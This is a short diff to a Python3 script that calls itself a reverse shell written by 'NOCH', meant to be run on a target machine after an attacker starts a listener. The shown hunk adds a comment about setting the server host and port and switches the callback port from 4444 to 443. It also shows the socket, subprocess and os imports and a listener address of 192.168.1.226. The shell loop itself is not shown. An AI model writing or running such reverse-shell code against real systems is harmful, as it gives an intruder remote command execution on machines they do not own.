@@ -3,13 +3,14 @@
 # Reverse Shell Written by NOCH in Python3 #
 
 # Run this script on a target machine after starting the server listener #
+# Change SERVER_HOST / SERVER_PORT accordingly #
 
 import socket
 import subprocess
 import os
 
 SERVER_HOST = "192.168.1.226" # CHANGE ME
-SERVER_PORT = 4444 # CHANGE ME
+SERVER_PORT = 443 # CHANGE ME
 BUFFER_SIZE = 4096 # Send 4KB at a time
 
 # Create socket object "server"
